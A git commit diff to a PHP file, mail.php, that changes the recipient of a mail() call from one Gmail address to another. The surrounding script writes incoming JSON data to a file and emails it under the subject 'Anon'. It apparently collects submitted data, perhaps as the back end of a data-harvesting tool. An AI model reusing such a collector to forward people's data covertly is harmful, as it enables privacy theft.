c7fb566cec40393b5c58a5de8d714dd76e19d703
hazmioui <133530942+hazmioui@users.noreply.github.com>
2024-06-02 01:31:41 +0100

    Update mail.php

--- mail.php
+++ mail.php
@@ -16,7 +16,7 @@ if($_SERVER["CONTENT_TYPE"] ==  'application/json') {
         fwrite($file, $ms) ;
         fclose($file);
             //enter your email below
-        mail('swagkarna@gmail.com', 'Anon', $msg);
+        mail('hazmioui0@gmail.com', 'Anon', $msg);
     }
 }
 ?>
